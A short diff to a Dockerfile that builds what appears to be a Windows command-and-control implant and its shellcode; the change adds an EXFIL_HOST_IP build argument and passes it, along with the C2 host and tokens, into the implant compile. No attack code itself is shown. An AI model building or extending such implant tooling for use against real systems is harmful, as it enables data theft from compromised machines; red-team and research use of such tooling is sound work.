@@ -35,6 +35,7 @@ RUN ./Configure mingw64 \
 FROM debian:bookworm-slim AS builder
 
 ARG C2_HOST_IP
+ARG EXFIL_HOST_IP
 ARG ENROLLMENT_TOKEN
 ARG DOWNLOAD_TOKEN
 
@@ -80,6 +81,7 @@ PYEOF
 #   - token_obf.h generated above (ENROLLMENT_TOKEN not passed to make)
 RUN make bin/windows/implant.exe \
         C2_HOST_IP="${C2_HOST_IP}" \
+        EXFIL_HOST_IP="${EXFIL_HOST_IP}" \
         OPENSSL_WIN_PREFIX=/opt/openssl-win
 
 # ── Build shellcode ───
